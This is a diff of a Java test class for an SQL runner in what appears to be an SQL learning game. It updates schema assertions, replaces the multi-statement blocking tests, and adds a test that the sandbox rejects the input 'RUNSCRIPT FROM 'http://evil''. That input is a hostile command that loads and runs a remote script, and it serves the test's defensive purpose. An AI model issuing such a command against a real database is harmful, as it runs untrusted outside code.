@@ -17,39 +17,46 @@ class SqlRunnerTest {
         LevelDefinition level = repo.byId("level-1").orElseThrow();
         runner.reset(level);
 
-        Map<String, List<String>> schema = runner.schemaForLevel(level);
+        List<Map<String, Object>> schema = runner.schemaForLevel(level);
 
-        assertTrue(schema.containsKey("CUSTOMERS"));
-        assertEquals(List.of("ID", "NAME", "CITY"), schema.get("CUSTOMERS"));
+        assertFalse(schema.isEmpty());
+        Map<String, Object> customers = schema.stream().filter(t -> "CUSTOMERS".equals(t.get("name"))).findFirst().orElseThrow();
+        List<Map<String, String>> columns = (List<Map<String, String>>) customers.get("columns");
+        assertEquals(List.of("ID", "NAME", "CITY"), columns.stream().map(c -> c.get("name")).toList());
     }
 
     @Test
-    void blocksMultipleStatementsInLevelRun() {
+    void allowsSingleSelectStatementForLevelRun() {
         LevelRepository repo = new LevelRepository();
         SqlRunner runner = new SqlRunner();
         LevelDefinition level = repo.byId("level-1").orElseThrow();
         runner.reset(level);
 
-        var result = runner.runForLevel(level, "SELECT name FROM customers; SELECT city FROM customers;");
+        var result = runner.runForLevel(level, "SELECT name FROM customers ORDER BY name;");
 
-        assertFalse(result.isOk());
-        assertEquals("Please run exactly one SQL statement at a time.", result.error);
+        assertNull(result.error);
+        assertEquals(List.of("NAME"), result.columns);
+        assertFalse(result.rows.isEmpty());
     }
 
     @Test
-    void singleStatementValidationHandlesCommentsAndSemicolonsInStrings() {
-        assertTrue(SqlRunner.isSingleStatement("SELECT ';' AS semi;"));
-        assertTrue(SqlRunner.isSingleStatement("-- one query\nSELECT 1;"));
-        assertFalse(SqlRunner.isSingleStatement("SELECT 1; /* split */ SELECT 2;"));
-    }
-
-    @Test
-    void commandAllowlistChecksFirstToken() {
+    void commandAllowlistBlocksNonSelect() {
+        LevelRepository repo = new LevelRepository();
         SqlRunner runner = new SqlRunner();
-        LevelDefinition level = new LevelDefinition();
-        level.allowedCommands = List.of("SELECT");
+        LevelDefinition level = repo.byId("level-1").orElseThrow();
+        runner.reset(level);
 
-        assertTrue(runner.isAllowed(level, "  -- a comment\nSELECT * FROM t"));
-        assertFalse(runner.isAllowed(level, "DELETE FROM t"));
+        var result = runner.runForLevel(level, "DELETE FROM customers;");
+
+        assertEquals("This level only allows: SELECT", result.error);
+    }
+
+    @Test
+    void forbiddenCommandsAreBlockedInSandbox() {
+        SqlRunner runner = new SqlRunner();
+
+        var result = runner.runSandbox("RUNSCRIPT FROM 'http://evil';");
+
+        assertEquals("That command is blocked in sandbox mode for safety.", result.error);
     }
 }
